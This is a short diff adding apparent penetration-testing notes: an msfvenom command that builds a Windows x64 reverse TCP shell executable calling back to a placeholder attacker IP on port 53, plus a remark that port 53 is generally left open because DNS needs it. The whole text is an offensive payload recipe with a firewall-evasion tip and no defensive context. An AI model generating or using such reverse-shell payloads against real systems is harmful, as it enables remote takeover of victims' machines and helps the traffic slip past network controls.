@@ -1,0 +1,3 @@
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attakerIP> LPORT=53 -f exe -o reverse.exe
+
+use 53 generally not blocked as essentail port for DNS
